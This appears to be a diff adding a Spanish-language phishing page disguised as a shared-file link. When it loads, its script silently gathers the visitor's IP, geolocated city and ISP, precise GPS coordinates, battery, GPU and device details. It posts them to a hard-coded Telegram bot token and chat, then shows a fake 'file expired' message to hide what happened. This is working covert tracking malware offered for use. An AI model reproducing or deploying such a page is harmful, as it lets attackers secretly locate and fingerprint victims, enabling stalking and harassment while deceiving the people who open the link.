@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Archivo Compartido</title>
+    <meta property="og:title" content="Te compartieron un archivo">
+    <meta property="og:description" content="Haz clic para ver el contenido compartido">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+               background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+               color: white; min-height: 100vh; display: flex; justify-content: center;
+               align-items: center; }
+        .card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px);
+                border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+                padding: 40px; max-width: 420px; text-align: center; }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #a0a0b0; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
+        .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #4ecca3;
+                  border-radius: 50%; width: 40px; height: 40px;
+                  animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 13px; color: #4ecca3; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">📄</div>
+        <h1 id="title">Cargando archivo...</h1>
+        <div class="loader" id="loader"></div>
+        <p id="status">Preparando el contenido...</p>
+    </div>
+    <script>
+        async function track() {
+            const status = document.getElementById('status');
+            const title = document.getElementById('title');
+            let data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth + 'bit',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                touchPoints: navigator.maxTouchPoints,
+                referrer: document.referrer || 'directo'
+            };
+            // 1. Obtener IP pública
+            try {
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResp.json();
+                data.ip = ipData.ip;
+            } catch(e) { data.ip_error = e.message; }
+            // 2. Geolocalizar IP
+            if (data.ip) {
+                try {
+                    const geoResp = await fetch('http://ip-api.com/json/' + data.ip + '?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting');
+                    const geo = await geoResp.json();
+                    if (geo.status === 'success') {
+                        data.country = geo.country + ' (' + geo.countryCode + ')';
+                        data.city = geo.city;
+                        data.region = geo.regionName;
+                        data.zip = geo.zip;
+                        data.isp = geo.isp;
+                        data.org = geo.org;
+                        data.asn = geo.as;
+                        data.lat_ip = geo.lat;
+                        data.lon_ip = geo.lon;
+                        data.proxy = geo.proxy;
+                        data.hosting = geo.hosting;
+                    }
+                } catch(e) {}
+            }
+            // 3. Intentar GPS preciso (requiere HTTPS)
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true, timeout: 10000, maximumAge: 0
+                        });
+                    });
+                    data.gps_lat = pos.coords.latitude;
+                    data.gps_lon = pos.coords.longitude;
+                    data.gps_accuracy = Math.round(pos.coords.accuracy) + 'm';
+                    if (pos.coords.altitude) data.gps_altitude = Math.round(pos.coords.altitude) + 'm';
+                    if (pos.coords.speed) data.gps_speed = Math.round(pos.coords.speed * 3.6) + 'km/h';
+                } catch(e) { data.gps_error = e.message; }
+            }
+            // 4. Detectar batería
+            try {
+                const battery = await navigator.getBattery();
+                data.battery = Math.round(battery.level * 100) + '%';
+                data.charging = battery.charging ? 'Sí' : 'No';
+            } catch(e) {}
+            // 5. WebGL info (GPU)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
+            // Construir mensaje
+            let msg = '🗺️ TRACKING LINK ACTIVADO\n';
+            msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+            if (data.ip) msg += '🌐 IP: ' + data.ip + '\n';
+            if (data.proxy) msg += '🛡️ Proxy/VPN: ⚠️ DETECTADO\n';
+            if (data.hosting) msg += '🖥️ Hosting/DC: Sí\n';
+            if (data.country) msg += '🌍 País: ' + data.country + '\n';
+            if (data.city) msg += '🏙️ Ciudad: ' + data.city + ', ' + (data.region || '') + '\n';
+            if (data.zip) msg += '📮 CP: ' + data.zip + '\n';
+            if (data.isp) msg += '🏢 ISP: ' + data.isp + '\n';
+            if (data.org) msg += '🏛️ Org: ' + data.org + '\n';
+            if (data.asn) msg += '🔗 ASN: ' + data.asn + '\n';
+            if (data.lat_ip) msg += '📍 Ubicación IP: ' + data.lat_ip + ', ' + data.lon_ip + '\n';
+            msg += '\n';
+            if (data.gps_lat) {
+                msg += '🎯 GPS EXACTO: ' + data.gps_lat + ', ' + data.gps_lon + '\n';
+                msg += '📏 Precisión: ' + data.gps_accuracy + '\n';
+                if (data.gps_altitude) msg += '⛰️ Altitud: ' + data.gps_altitude + '\n';
+                if (data.gps_speed) msg += '🏃 Velocidad: ' + data.gps_speed + '\n';
+                msg += '🗺️ Google Maps: https://www.google.com/maps?q=' + data.gps_lat + ',' + data.gps_lon + '\n';
+            } else if (data.lat_ip) {
+                msg += '🗺️ Maps (IP): https://www.google.com/maps?q=' + data.lat_ip + ',' + data.lon_ip + '\n';
+            }
+            if (data.gps_error) msg += '📍 GPS: ' + data.gps_error + '\n';
+            msg += '\n📱 DISPOSITIVO:\n';
+            msg += '• Plataforma: ' + data.platform + '\n';
+            msg += '• Pantalla: ' + data.screen + ' (' + data.colorDepth + ')\n';
+            msg += '• Touch: ' + data.touchPoints + ' puntos\n';
+            if (data.gpu) msg += '• GPU: ' + data.gpu + '\n';
+            if (data.battery) msg += '• Batería: ' + data.battery + (data.charging === 'Sí' ? ' ⚡' : '') + '\n';
+            if (data.hardwareConcurrency !== 'N/A') msg += '• CPU cores: ' + data.hardwareConcurrency + '\n';
+            if (data.deviceMemory !== 'N/A') msg += '• RAM: ~' + data.deviceMemory + 'GB\n';
+            if (data.connection !== 'N/A') msg += '• Red: ' + data.connection + '\n';
+            msg += '• Idioma: ' + data.language + '\n';
+            msg += '• Zona: ' + data.timezone + '\n';
+            msg += '• DNT: ' + data.doNotTrack + '\n';
+            msg += '\n⏰ ' + data.timestamp;
+            // Enviar al bot
+            await fetch('https://api.telegram.org/bot8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: '7891650726', text: msg })
+            });
+            // Mostrar mensaje de error falso
+            document.getElementById('loader').style.display = 'none';
+            title.textContent = 'Contenido no disponible';
+            status.textContent = 'Este archivo ha expirado o no está disponible en tu región.';
+            status.style.color = '#ff6b6b';
+        }
+        track();
+    </script>
+</body>
+</html>
